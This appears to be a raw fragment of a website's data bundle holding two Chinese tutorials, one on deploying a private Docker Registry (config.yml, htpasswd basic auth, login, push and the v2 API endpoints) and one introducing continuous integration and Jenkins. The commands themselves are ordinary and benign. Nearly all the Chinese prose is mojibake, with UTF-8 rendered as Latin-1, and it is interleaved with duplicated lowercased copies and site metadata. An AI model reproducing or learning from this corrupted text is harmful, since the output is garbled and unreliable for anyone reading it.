æ¥å£ä¸ Docker Hub è¿è¡äº¤äºï¼å¯ä»¥æç´¢ãä¸è½½ãä¸ä¼ åå é¤éåï¼ç®¡çä»åºãæ ç­¾åç»ç»ç­\n * Registry APIï¼Registry API æ¯ä¸ Docker Registry è¿è¡äº¤äºç API æ¥å£ãDocker Registry æ¯ä¸ä¸ªç§æç Docker éåä»åºï¼å¯ä»¥èªå·±æ­å»ºåç®¡çãRegistry API åè®¸ç¨æ·éè¿ API æ¥å£ä¸ç§æç Docker Registry è¿è¡äº¤äºï¼å¯ä»¥ä¸ä¼ ãä¸è½½åå é¤éåï¼ç®¡çä»åºåæ ç­¾ç­\n\næ²¡éï¼å¦æéè¦å»ºç«èªå·±ç docker ç§æåºå°±è¦ç¨å° Registry APIã\n\n\n# åå¤\n\nè¦å¨æ¬å°æ­å»ºç§æç Docker Registryï¼æ¨å¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡æä½ï¼\n\n 1. ç¡®ä¿å·²ç»å®è£ Dockerï¼è¥è¿æ²¡æï¼æ¨å¯ä»¥ä» Docker å®æ¹ç½ç«ï¼https://www.docker.com/ï¼ä¸è½½å¹¶å®è£éç¨äºæ¨çæä½ç³»ç»ç Docker çæ¬ã\n 2. éç½® Docker Registryï¼æ¥ä¸æ¥ï¼æ¨éè¦åå»ºå¹¶éç½® Docker Registryãå¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡éç½®ï¼\n    * åå»ºä¸ä¸ªå­å¨ Registry æ°æ®çç®å½ãä¾å¦ï¼æ¨å¯ä»¥åå»ºä¸ä¸ªåä¸º /var/lib/registry çç®å½ã\n    * åå»ºä¸ä¸ªåä¸º config.yml çéç½®æä»¶ï¼å¹¶å¨å¶ä¸­æå® Registry çéç½®éé¡¹ãä¾å¦ï¼æ¨å¯ä»¥æå® Registry çå¬å¨ 5000 ç«¯å£ä¸ï¼å¹¶åè®¸å¿åè®¿é®ãï¼å·ä½è§ä¸é¢ config éç½®è®²è§£ï¼\n 3. ä¸º Docker Registry API æåéç½®\n    åè¿è¡éç½®ï¼å» /etc/docker/daemon.json æ·»å å¦ä¸ä¸å¥ï¼æå¥½æ¯å®¿ä¸»æºç IPï¼ ä¸è¦ä½¿ç¨ 127.0.0.1 ï¼æè¿éæ¯æ¹ä¾¿æµè¯ï¼ä¸ä½¿ç¨å®¿ä¸»æº IPï¼ä¼é æå¨ä½¿ç¨ Docker Engine API æ¥ HTTPS éè¯¯ã\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\néç½®å®æåéè¦éæ°å¯å¨ Docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. å¯å¨ Registry å®¹å¨ï¼ä½¿ç¨ä»¥ä¸å½ä»¤å¨æ¬å°å¯å¨ Registry å®¹å¨ï¼å®æ¹ææ¡£ https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaODY2NTEyNi4xNjkyMDAxODU2_ga_XJWPQMJYHQ*MTY5Mzk5NzEyNy4yNS4xLjE2OTM5OTcyMTAuNTMuMC4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerRegistry:/var/lib/registry -v /opt/software/dockerRegistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\nè¿ä¸ªå½ä»¤å°å¨æ¬å°å¯å¨ä¸ä¸ªåä¸º registry çå®¹å¨ï¼å¹¶å°æ¬å°ç /var/lib/registry ç®å½æè½½å°å®¹å¨ç /var/lib/registry ç®å½ï¼ä»¥ä¿å­ Registry çæ°æ®ã\n5. æµè¯ Registryï¼ç°å¨ï¼æ¨çç§æ Docker Registry åºè¯¥å·²ç»å¨æ¬å°æåæ­å»ºãæ¨å¯ä»¥ä½¿ç¨ä»¥ä¸å½ä»¤æ¥æµè¯ Registry æ¯å¦æ­£å¸¸å·¥ä½ï¼\n\n * ä» Docker Hub æåä¸ä¸ªéåï¼\n\ndocker pull ubuntu\n\n\n1\n\n * æ è®°è¯¥éåä¸ºç§æ Registry çå°åï¼\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * å°æ è®°çéåæ¨éå°ç§æ Registryï¼\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * ä»ç§æ Registry æåéåï¼\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\nå¦æä¸è¿°æ­¥éª¤é½æåæ§è¡ï¼é£ä¹ç§æ Docker Registry å°±å·²ç»æ­å»ºå¥½äºï¼å¹¶ä¸å¯ä»¥éè¿ http://127.0.0.1:5000/v2/my-ubuntu/tags/list è¿è¡è®¿é®ã\n\n\n# config.yml\n\nconfig éé¢æ¯ä¸äºéç½®ä¿¡æ¯ï¼åæ¬å­å¨åºä½ç½®ï¼æ¥å¿ï¼å®å¨è®¤è¯ç­ï¼é¦åè¦éç½®å®å¨è®¤è¯\n\n# å®è£ htpasswd æä»¶çå·¥å·\nyum install -y httpd-tools\n# åå»ºä¸ä¸ª htpasswd æä»¶ï¼å¹¶æ·»å ç¨æ·ååå¯ç \nhtpasswd -Bbn user1 password1 > /opt/software/dockerRegistry/htpasswd\n\n\n1\n2\n3\n4\n\n\néç½® config.xml\n\n# æå®éç½®æä»¶ççæ¬ãç®åå¯ç¨ççæ¬ä¸º0.1ã\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # æå®å­å¨éåæ°æ®çç®å½è·¯å¾ã                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # å¯æ§è¡å é¤æä½ï¼ä¸è½ç                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# æ´æ¼ç«¯å£                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    X-Content-Type-Options: [nosniff]    \n# å¿è·³                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# åºæ¬è®¤è¯(Basic Auth)ï¼è¿å¯ä»¥ä½¿ç¨Bearer Tokenè®¤è¯ãAWSè®¤è¯ãLDAPè®¤è¯\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerRegistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå¦æå·²ç»å¯å¨å®¹å¨ï¼ä¿®æ¹åéè¦éæ°å¯å¨å®¹å¨\n\n\n# ä½¿ç¨ Docker Registry\n\næ¥ä¸æ¥åç»å½æä»¬çç§æåºï¼å¦ææ¯æ¬æºï¼ä½¿ç¨ 127.0.0.1ï¼å¦ææ²¡è®¾ç½®è´¦å·å¯ç ï¼åé»è®¤æ¯å®¿ä¸»æºæ¬èº« SSH è¿æ¥çè´¦å·å¯ç \n\ndocker login <registry_host>\n# å¯ä»¥ä½¿ç¨å¿«æ·å½ä»¤\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\nç»åº\n\ndocker logout <registry_host>\n\n\n1\n\n\nä¸ºéè¦æ¨éçéåæ tagï¼å¿é¡»ï¼\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\næ¨ééå\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# è®¿é® Registry API\n\nAPI çè®¿é®è¾å¥ä½  docker æå¨ç IPï¼å ä»¥ä¸è®¾ç½®çç«¯å£å°±è¡ï¼è®¿é®éè¦å¸¦çæ¬å·ï¼ç®å Docker å»ºè®®ä½¿ç¨ v2 çæ¬ï¼æä»¥è¯·æ±è·¯å¾éè¦å¸¦ä¸ï¼å¦ï¼ http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * æ£æ¥è¿æ¥ï¼ä¸å®è¦èèå¼å®¹ï¼\n\nGET /v2/\nè¿å 200 ä»£è¡¨ok\nè¿å 401 ä»£è¡¨éè¦èº«ä»½éªè¯\nè¿å 404 ä»£è¡¨æ³¨åè¡¨æªå®ç° /v2/ï¼æå¯è½å°±æ¯ v1\n\n\n1\n2\n3\n4\n\n * ååºå­å¨åºï¼\n\n// è·åå¨é¨\nGET /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// åé¡µè·å\nGET /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * ååºéå tags\n\n/v2/<ImagesName>/tags/list \n\n\n1\n',normalizedContent:'æ­£å¸¸æ¥è¯´æä»¬ä½¿ç¨å«äººçç§æåºå°±è¶³å¤äºï¼æ¯å¦ä½¿ç¨ harborï¼å®å¯ä»¥å¸®æä»¬å¾å¥½çç®¡ç dockerï¼ä»¥åé¨ç½²ä¸ºç§ææå¬æåºç»ä¼ä¸æå¶ä»äººä½¿ç¨ï¼å¦ææ³å¼åä¸å¥é£ä¹éè¦äºè§£ docker ç¸å³ç apiï¼å¶ä¸­ dockerapi åä¸ºå¦ä¸ä¸é¨åï¼\n\n * docker engine apiï¼docker engine api æ¯ docker å¼æç api æ¥å£ï¼ç¨äºä¸ docker å¼æè¿è¡éä¿¡åç®¡çãéè¿ docker engine apiï¼å¯ä»¥ç®¡çå®¹å¨ãéåãç½ç»ãå·ç­ docker ç¸å³èµæºãå¯ä»¥ä½¿ç¨ docker engine api åå»ºãå¯å¨ãåæ­¢åå é¤å®¹å¨ï¼æå»ºåæ¨ééåï¼ä»¥åè¿è¡å®¹å¨åéåçç®¡çåçæ§ã\n * docker hub apiï¼docker hub api æ¯ä¸ docker hub äº¤äºç api æ¥å£ãdocker hub æ¯ä¸ä¸ªå¬å±ç docker éåä»åºï¼ç¨äºå­å¨ååäº« docker éåãdocker hub api åè®¸ç¨æ·éè¿ api æ¥å£ä¸ docker hub è¿è¡äº¤äºï¼å¯ä»¥æç´¢ãä¸è½½ãä¸ä¼ åå é¤éåï¼ç®¡çä»åºãæ ç­¾åç»ç»ç­\n * registry apiï¼registry api æ¯ä¸ docker registry è¿è¡äº¤äºç api æ¥å£ãdocker registry æ¯ä¸ä¸ªç§æç docker éåä»åºï¼å¯ä»¥èªå·±æ­å»ºåç®¡çãregistry api åè®¸ç¨æ·éè¿ api æ¥å£ä¸ç§æç docker registry è¿è¡äº¤äºï¼å¯ä»¥ä¸ä¼ ãä¸è½½åå é¤éåï¼ç®¡çä»åºåæ ç­¾ç­\n\næ²¡éï¼å¦æéè¦å»ºç«èªå·±ç docker ç§æåºå°±è¦ç¨å° registry apiã\n\n\n# åå¤\n\nè¦å¨æ¬å°æ­å»ºç§æç docker registryï¼æ¨å¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡æä½ï¼\n\n 1. ç¡®ä¿å·²ç»å®è£ dockerï¼è¥è¿æ²¡æï¼æ¨å¯ä»¥ä» docker å®æ¹ç½ç«ï¼https://www.docker.com/ï¼ä¸è½½å¹¶å®è£éç¨äºæ¨çæä½ç³»ç»ç docker çæ¬ã\n 2. éç½® docker registryï¼æ¥ä¸æ¥ï¼æ¨éè¦åå»ºå¹¶éç½® docker registryãå¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡éç½®ï¼\n    * åå»ºä¸ä¸ªå­å¨ registry æ°æ®çç®å½ãä¾å¦ï¼æ¨å¯ä»¥åå»ºä¸ä¸ªåä¸º /var/lib/registry çç®å½ã\n    * åå»ºä¸ä¸ªåä¸º config.yml çéç½®æä»¶ï¼å¹¶å¨å¶ä¸­æå® registry çéç½®éé¡¹ãä¾å¦ï¼æ¨å¯ä»¥æå® registry çå¬å¨ 5000 ç«¯å£ä¸ï¼å¹¶åè®¸å¿åè®¿é®ãï¼å·ä½è§ä¸é¢ config éç½®è®²è§£ï¼\n 3. ä¸º docker registry api æåéç½®\n    åè¿è¡éç½®ï¼å» /etc/docker/daemon.json æ·»å å¦ä¸ä¸å¥ï¼æå¥½æ¯å®¿ä¸»æºç ipï¼ ä¸è¦ä½¿ç¨ 127.0.0.1 ï¼æè¿éæ¯æ¹ä¾¿æµè¯ï¼ä¸ä½¿ç¨å®¿ä¸»æº ipï¼ä¼é æå¨ä½¿ç¨ docker engine api æ¥ https éè¯¯ã\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\néç½®å®æåéè¦éæ°å¯å¨ docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. å¯å¨ registry å®¹å¨ï¼ä½¿ç¨ä»¥ä¸å½ä»¤å¨æ¬å°å¯å¨ registry å®¹å¨ï¼å®æ¹ææ¡£ https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaody2nteyni4xnjkymdaxodu2_ga_xjwpqmjyhq*mty5mzk5nzeyny4yns4xlje2otm5otcymtauntmumc4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerregistry:/var/lib/registry -v /opt/software/dockerregistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\nè¿ä¸ªå½ä»¤å°å¨æ¬å°å¯å¨ä¸ä¸ªåä¸º registry çå®¹å¨ï¼å¹¶å°æ¬å°ç /var/lib/registry ç®å½æè½½å°å®¹å¨ç /var/lib/registry ç®å½ï¼ä»¥ä¿å­ registry çæ°æ®ã\n5. æµè¯ registryï¼ç°å¨ï¼æ¨çç§æ docker registry åºè¯¥å·²ç»å¨æ¬å°æåæ­å»ºãæ¨å¯ä»¥ä½¿ç¨ä»¥ä¸å½ä»¤æ¥æµè¯ registry æ¯å¦æ­£å¸¸å·¥ä½ï¼\n\n * ä» docker hub æåä¸ä¸ªéåï¼\n\ndocker pull ubuntu\n\n\n1\n\n * æ è®°è¯¥éåä¸ºç§æ registry çå°åï¼\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * å°æ è®°çéåæ¨éå°ç§æ registryï¼\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * ä»ç§æ registry æåéåï¼\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\nå¦æä¸è¿°æ­¥éª¤é½æåæ§è¡ï¼é£ä¹ç§æ docker registry å°±å·²ç»æ­å»ºå¥½äºï¼å¹¶ä¸å¯ä»¥éè¿ http://127.0.0.1:5000/v2/my-ubuntu/tags/list è¿è¡è®¿é®ã\n\n\n# config.yml\n\nconfig éé¢æ¯ä¸äºéç½®ä¿¡æ¯ï¼åæ¬å­å¨åºä½ç½®ï¼æ¥å¿ï¼å®å¨è®¤è¯ç­ï¼é¦åè¦éç½®å®å¨è®¤è¯\n\n# å®è£ htpasswd æä»¶çå·¥å·\nyum install -y httpd-tools\n# åå»ºä¸ä¸ª htpasswd æä»¶ï¼å¹¶æ·»å ç¨æ·ååå¯ç \nhtpasswd -bbn user1 password1 > /opt/software/dockerregistry/htpasswd\n\n\n1\n2\n3\n4\n\n\néç½® config.xml\n\n# æå®éç½®æä»¶ççæ¬ãç®åå¯ç¨ççæ¬ä¸º0.1ã\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # æå®å­å¨éåæ°æ®çç®å½è·¯å¾ã                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # å¯æ§è¡å é¤æä½ï¼ä¸è½ç                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# æ´æ¼ç«¯å£                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    x-content-type-options: [nosniff]    \n# å¿è·³                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# åºæ¬è®¤è¯(basic auth)ï¼è¿å¯ä»¥ä½¿ç¨bearer tokenè®¤è¯ãawsè®¤è¯ãldapè®¤è¯\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerregistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå¦æå·²ç»å¯å¨å®¹å¨ï¼ä¿®æ¹åéè¦éæ°å¯å¨å®¹å¨\n\n\n# ä½¿ç¨ docker registry\n\næ¥ä¸æ¥åç»å½æä»¬çç§æåºï¼å¦ææ¯æ¬æºï¼ä½¿ç¨ 127.0.0.1ï¼å¦ææ²¡è®¾ç½®è´¦å·å¯ç ï¼åé»è®¤æ¯å®¿ä¸»æºæ¬èº« ssh è¿æ¥çè´¦å·å¯ç \n\ndocker login <registry_host>\n# å¯ä»¥ä½¿ç¨å¿«æ·å½ä»¤\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\nç»åº\n\ndocker logout <registry_host>\n\n\n1\n\n\nä¸ºéè¦æ¨éçéåæ tagï¼å¿é¡»ï¼\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\næ¨ééå\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# è®¿é® registry api\n\napi çè®¿é®è¾å¥ä½  docker æå¨ç ipï¼å ä»¥ä¸è®¾ç½®çç«¯å£å°±è¡ï¼è®¿é®éè¦å¸¦çæ¬å·ï¼ç®å docker å»ºè®®ä½¿ç¨ v2 çæ¬ï¼æä»¥è¯·æ±è·¯å¾éè¦å¸¦ä¸ï¼å¦ï¼ http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * æ£æ¥è¿æ¥ï¼ä¸å®è¦èèå¼å®¹ï¼\n\nget /v2/\nè¿å 200 ä»£è¡¨ok\nè¿å 401 ä»£è¡¨éè¦èº«ä»½éªè¯\nè¿å 404 ä»£è¡¨æ³¨åè¡¨æªå®ç° /v2/ï¼æå¯è½å°±æ¯ v1\n\n\n1\n2\n3\n4\n\n * ååºå­å¨åºï¼\n\n// è·åå¨é¨\nget /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// åé¡µè·å\nget /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * ååºéå tags\n\n/v2/<imagesname>/tags/list \n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(ä¸) æç»­éæåJenkinsä»ç»",frontmatter:{title:"Jenkins(ä¸) æç»­éæåJenkinsä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/500",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/500.Jenkins(%E4%B8%80)%20%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%8F%8AJenkins%E4%BB%8B%E7%BB%8D.html",relativePath:"04.è¿ç»´/50.Jenkins/500.Jenkins(ä¸) æç»­éæåJenkinsä»ç».md",key:"v-909b2404",path:"/jenkins/500/",headers:[{level:2,title:"ä»ä¹æ¯æç»­éæ",slug:"ä»ä¹æ¯æç»­éæ",normalizedTitle:"ä»ä¹æ¯æç»­éæ",charIndex:2},{level:3,title:"æç»­éæçç»æè¦ç´ ",slug:"æç»­éæçç»æè¦ç´ ",normalizedTitle:"æç»­éæçç»æè¦ç´ ",charIndex:720},{level:3,title:"æç»­éæçå¥½å¤",slug:"æç»­éæçå¥½å¤",normalizedTitle:"æç»­éæçå¥½å¤",charIndex:902},{level:2,title:"Jenkinsä»ç»",slug:"jenkinsä»ç»",normalizedTitle:"jenkins ä»ç»",charIndex:1039}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä»ä¹æ¯æç»­éæ æç»­éæçç»æè¦ç´  æç»­éæçå¥½å¤ Jenkinsä»ç»",content:"# ä»ä¹æ¯æç»­éæ\n\næç»­éæï¼ Continuous integration ï¼ ç®ç§° CI ï¼æçæ¯ï¼é¢ç¹å°ï¼ä¸å¤©å¤æ¬¡ï¼å°ä»£ç éæå°ä¸»å¹²ã\n\næç»­éæçç®çï¼å°±æ¯è®©äº§åå¯ä»¥å¿«éè¿­ä»£ï¼åæ¶è¿è½ä¿æé«è´¨éãå®çæ ¸å¿æªæ½æ¯ï¼ä»£ç éæå°ä¸»å¹²ä¹åï¼å¿é¡»éè¿èªå¨åæµè¯ãåªè¦æä¸ä¸ªæµè¯ç¨ä¾å¤±è´¥ï¼å°±ä¸è½éæã\n\néè¿æç»­éæï¼ å¢éå¯ä»¥å¿«éçä»ä¸ä¸ªåè½å°å¦ä¸ä¸ªåè½ï¼ç®èè¨ä¹ï¼ææ·è½¯ä»¶å¼åå¾å¤§ä¸é¨åé½è¦å½åäºæç»­éæã\n\n\n\næ ¹æ®æç»­éæçè®¾è®¡ï¼ä»£ç ä»æäº¤å°çäº§ï¼æ´ä¸ªè¿ç¨æä»¥ä¸å æ­¥ã\n\n * æäº¤\n   æµç¨çç¬¬ä¸æ­¥ï¼æ¯å¼åèåä»£ç ä»åºæäº¤ä»£ç ãææåé¢çæ­¥éª¤é½å§äºæ¬å°ä»£ç çä¸æ¬¡æäº¤ï¼commitï¼ã\n * æµè¯ï¼ç¬¬ä¸è½®ï¼\n   ä»£ç ä»åºå¯¹ commit æä½éç½®äºé©å­ï¼hookï¼ï¼åªè¦æäº¤ä»£ç æèåå¹¶è¿ä¸»å¹²ï¼å°±ä¼è·èªå¨åæµè¯ã\n * æå»º\n   éè¿ç¬¬ä¸è½®æµè¯ï¼ä»£ç å°±å¯ä»¥åå¹¶è¿ä¸»å¹²ï¼å°±ç®å¯ä»¥äº¤ä»äºã\n   äº¤ä»åï¼å°±åè¿è¡æå»ºï¼buildï¼ï¼åè¿å¥ç¬¬äºè½®æµè¯ãæè°æå»ºï¼æçæ¯å°æºç è½¬æ¢ä¸ºå¯ä»¥è¿è¡çå®éä»£ç ï¼æ¯å¦å®è£ä¾èµï¼éç½®åç§èµæºï¼æ ·å¼è¡¨ãJS èæ¬ãå¾çï¼ç­ç­ã\n * æµè¯ï¼ç¬¬äºè½®ï¼\n   æå»ºå®æï¼å°±è¦è¿è¡ç¬¬äºè½®æµè¯ãå¦æç¬¬ä¸è½®å·²ç»æ¶µçäºæææµè¯åå®¹ï¼ç¬¬äºè½®å¯ä»¥çç¥ï¼å½ç¶ï¼è¿æ¶æå»ºæ­¥éª¤ä¹è¦ç§»å°ç¬¬ä¸è½®æµè¯åé¢ã\n * é¨ç½²\n   è¿äºç¬¬äºè½®æµè¯ï¼å½åä»£ç å°±æ¯ä¸ä¸ªå¯ä»¥ç´æ¥é¨ç½²ççæ¬ï¼artifactï¼ãå°è¿ä¸ªçæ¬çæææä»¶æåï¼tar filename.tar * ï¼å­æ¡£ï¼åå°çäº§æå¡å¨ã\n * åæ»\n   ä¸æ¦å½åçæ¬åçé®é¢ï¼å°±è¦åæ»å°ä¸ä¸ä¸ªçæ¬çæå»ºç»æãæç®åçåæ³å°±æ¯ä¿®æ¹ä¸ä¸ç¬¦å·é¾æ¥ï¼æåä¸ä¸ä¸ªçæ¬çç®å½ã\n\n\n# æç»­éæçç»æè¦ç´ \n\n * ä¸ä¸ªèªå¨æå»ºè¿ç¨ï¼ ä»æ£åºä»£ç ã ç¼è¯æå»ºã è¿è¡æµè¯ã ç»æè®°å½ã æµè¯ç»è®¡ç­é½æ¯èªå¨å®æçï¼ æ éäººå·¥å¹²é¢ã\n * ä¸ä¸ªä»£ç å­å¨åºï¼å³éè¦çæ¬æ§å¶è½¯ä»¶æ¥ä¿éä»£ç çå¯ç»´æ¤æ§ï¼åæ¶ä½ä¸ºæå»ºè¿ç¨çç´ æåºï¼ä¸è¬ä½¿ç¨ SVN æ Gitã\n * ä¸ä¸ªæç»­éææå¡å¨ï¼ Jenkins å°±æ¯ä¸ä¸ªéç½®ç®ååä½¿ç¨æ¹ä¾¿çæç»­éææå¡å¨ã\n\n\n\n\n# æç»­éæçå¥½å¤\n\n1ãéä½é£é©ï¼ç±äºæç»­éæä¸æ­å»æå»ºï¼ç¼è¯åæµè¯ï¼å¯ä»¥å¾æ©æåç°é®é¢ï¼æä»¥ä¿®å¤çä»£ä»·å°±å°ï¼\n2ãå¯¹ç³»ç»å¥åº·æç»­æ£æ¥ï¼åå°åå¸é£é©å¸¦æ¥çé®é¢ï¼\n3ãåå°éå¤æ§å·¥ä½ï¼\n4ãæç»­é¨ç½²ï¼æä¾å¯é¨ç½²åååï¼\n5ãæç»­äº¤ä»å¯ä¾ä½¿ç¨ççæ¬ï¼\n6ãå¢å¼ºå¢éä¿¡å¿ï¼\n\n\n# Jenkins ä»ç»\n\nJenkins æ¯ä¸æ¬¾æµè¡çå¼æºæç»­éæï¼Continuous Integrationï¼å·¥å·ï¼å¹¿æ³ç¨äºé¡¹ç®å¼åï¼å·æèªå¨åæå»ºãæµè¯åé¨ç½²ç­åè½ãå®ç½ï¼ http://jenkins-ci.org/ã\n\nJenkins çç¹å¾ï¼\n\n * å¼æºç Java è¯­è¨å¼åæç»­éæå·¥å·ï¼æ¯ææç»­éæï¼æç»­é¨ç½²ã\n * æäºå®è£é¨ç½²éç½®ï¼å¯éè¿ yum å®è£ï¼æä¸è½½ war åä»¥åéè¿ docker å®¹å¨ç­å¿«éå®ç°å®è£é¨ç½²ï¼å¯æ¹ä¾¿ web çé¢éç½®ç®¡çã\n * æ¶æ¯éç¥åæµè¯æ¥åï¼éæ RSS/E-mail éè¿ RSS åå¸æå»ºç»ææå½æå»ºå®ææ¶éè¿ e-mail éç¥ï¼çæ JUnit/TestNG æµè¯æ¥åã\n * åå¸å¼æå»ºï¼æ¯æ Jenkins è½å¤è®©å¤å°è®¡ç®æºä¸èµ·æå»º / æµè¯ã\n * æä»¶è¯å«ï¼Jenkins è½å¤è·è¸ªåªæ¬¡æå»ºçæåªäº jarï¼åªæ¬¡æå»ºä½¿ç¨åªä¸ªçæ¬ç jar ç­ã\n * ä¸°å¯çæä»¶æ¯æï¼æ¯ææ©å±æä»¶ï¼ä½ å¯ä»¥å¼åéåèªå·±å¢éä½¿ç¨çå·¥å·ï¼å¦ gitï¼svnï¼mavenï¼docker ç­ã",normalizedContent:"# ä»ä¹æ¯æç»­éæ\n\næç»­éæï¼ continuous integration ï¼ ç®ç§° ci ï¼æçæ¯ï¼é¢ç¹å°ï¼ä¸å¤©å¤æ¬¡ï¼å°ä»£ç éæå°ä¸»å¹²ã\n\næç»­éæçç®çï¼å°±æ¯è®©äº§åå¯ä»¥å¿«éè¿­ä»£ï¼åæ¶è¿è½ä¿æé«è´¨éãå®çæ ¸å¿æªæ½æ¯ï¼ä»£ç éæå°ä¸»å¹²ä¹åï¼å¿é¡»éè¿èªå¨åæµè¯ãåªè¦æä¸ä¸ªæµè¯ç¨ä¾å¤±è´¥ï¼å°±ä¸è½éæã\n\néè¿æç»­éæï¼ å¢éå¯ä»¥å¿«éçä»ä¸ä¸ªåè½å°å¦ä¸ä¸ªåè½ï¼ç®èè¨ä¹ï¼ææ·è½¯ä»¶å¼åå¾å¤§ä¸é¨åé½è¦å½åäºæç»­éæã\n\n\n\næ ¹æ®æç»­éæçè®¾è®¡ï¼ä»£ç ä»æäº¤å°çäº§ï¼æ´ä¸ªè¿ç¨æä»¥ä¸å æ­¥ã\n\n * æäº¤\n   æµç¨çç¬¬ä¸æ­¥ï¼æ¯å¼åèåä»£ç ä»åºæäº¤ä»£ç ãææåé¢çæ­¥éª¤é½å§äºæ¬å°ä»£ç çä¸æ¬¡æäº¤ï¼commitï¼ã\n * æµè¯ï¼ç¬¬ä¸è½®ï¼\n   ä»£ç ä»åºå¯¹ commit æä½éç½®äºé©å­ï¼hookï¼ï¼åªè¦æäº¤ä»£ç æèåå¹¶è¿ä¸»å¹²ï¼å°±ä¼è·èªå¨åæµè¯ã\n * æå»º\n   éè¿ç¬¬ä¸è½®æµè¯ï¼ä»£ç å°±å¯ä»¥åå¹¶è¿ä¸»å¹²ï¼å°±ç®å¯ä»¥äº¤ä»äºã\n   äº¤ä»åï¼å°±åè¿è¡æå»ºï¼buildï¼ï¼åè¿å¥ç¬¬äºè½®æµè¯ãæè°æå»ºï¼æçæ¯å°æºç è½¬æ¢ä¸ºå¯ä»¥è¿è¡çå®éä»£ç ï¼æ¯å¦å®è£ä¾èµï¼éç½®åç§èµæºï¼æ ·å¼è¡¨ãjs èæ¬ãå¾çï¼ç­ç­ã\n * æµè¯ï¼ç¬¬äºè½®ï¼\n   æå»ºå®æï¼å°±è¦è¿è¡ç¬¬äºè½®æµè¯ãå¦æç¬¬ä¸è½®å·²ç»æ¶µçäºæææµè¯åå®¹ï¼ç¬¬äºè½®å¯ä»¥çç¥ï¼å½ç¶ï¼è¿æ¶æå»ºæ­¥éª¤ä¹è¦ç§»å°ç¬¬ä¸è½®æµè¯åé¢ã\n * é¨ç½²\n   è¿äºç¬¬äºè½®æµè¯ï¼å½åä»£ç å°±æ¯ä¸ä¸ªå¯ä»¥ç´æ¥é¨ç½²ççæ¬ï¼artifactï¼ãå°è¿ä¸ªçæ¬çæææä»¶æåï¼tar filename.tar * 